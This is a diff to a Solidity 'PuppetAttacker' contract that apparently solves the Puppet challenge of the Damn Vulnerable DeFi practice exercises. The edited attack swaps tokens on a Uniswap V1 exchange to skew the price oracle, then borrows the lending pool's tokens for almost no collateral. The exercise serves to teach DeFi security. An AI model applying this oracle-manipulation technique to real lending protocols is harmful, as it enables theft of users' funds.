@@ -11,12 +11,12 @@ contract PuppetAttacker {
 
     }
 
-    function attack(IUniswapV1Exchange uniswapV1Exchange, DamnValuableToken token, PuppetPool pool, address recovery, uint256 borrowAmount) external{
+    function attack(IUniswapV1Exchange uniswapV1Exchange, DamnValuableToken token, PuppetPool pool, address recovery, uint256 borrowAmount) external payable{
         uint256 tokenAmount = token.balanceOf(address(this));
-        token.approve(address(pool),tokenAmount );
-        uniswapV1Exchange.tokenToEthSwapInput(tokenAmount, 0, block.timestamp);
+        token.approve(address(uniswapV1Exchange),tokenAmount);
+        uniswapV1Exchange.tokenToEthSwapInput(tokenAmount, 1e18, block.timestamp);
 
-        pool.borrow(borrowAmount, recovery);
+        pool.borrow{value:address(this).balance}(borrowAmount, recovery);
         SafeTransferLib.safeTransferETH(msg.sender, address (this).balance);
     }
     receive() external payable{}
